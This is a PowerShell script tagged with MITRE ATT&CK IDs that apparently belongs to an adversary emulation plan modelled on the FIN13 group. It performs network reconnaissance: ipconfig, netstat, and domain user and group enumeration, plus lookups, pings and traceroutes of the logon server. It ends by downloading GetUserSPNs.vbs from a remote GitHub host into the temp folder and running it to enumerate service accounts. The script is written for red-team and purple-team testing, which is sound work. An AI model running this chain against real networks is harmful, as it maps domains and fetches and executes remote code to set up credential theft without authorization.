<#
STEP: NETWORK RECONNAISSANCE
** Run PowerShell with Administrative Privileges **
#>

#T1016
ipconfig /all;

#T1049
netstat -ano;

#T1016, T1059.03, T1059
cmd /c echo %USERDOMAIN%

#T1087.002
net user /domain;
net group /domain;

#T1059, T1059.003, T1016
cmd /c echo %LOGONSERVER%;
cmd /c echo %USERDNSDOMAIN%;

#T1018
nslookup $(24).response[\"result\"].strip(\"\\\\\").strip(\"\\r\\n\").suffix(\".\")$(25).response[\"result\"].strip(\"\\r\\n\");
ping -n 1 $(24).response[\"result\"].strip(\"\\\\\").strip(\"\\r\\n\").suffix(\".\")$(25).response[\"result\"].strip(\"\\r\\n\");
tracert $(24).response[\"result\"].strip(\"\\\\\").strip(\"\\r\\n\").suffix(\".\")$(25).response[\"result\"].strip(\"\\r\\n\");

#T1105
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/scythe-io/community-threats/master/FIN13/VFS/GetUserSPNs.vbs") | Out-File "$env:TEMP\GetUserSPNs.vbs";

#T1059.005, T1059, T1087, T1087.002
cscript $env:TEMP\GetUserSPNs.vbs;

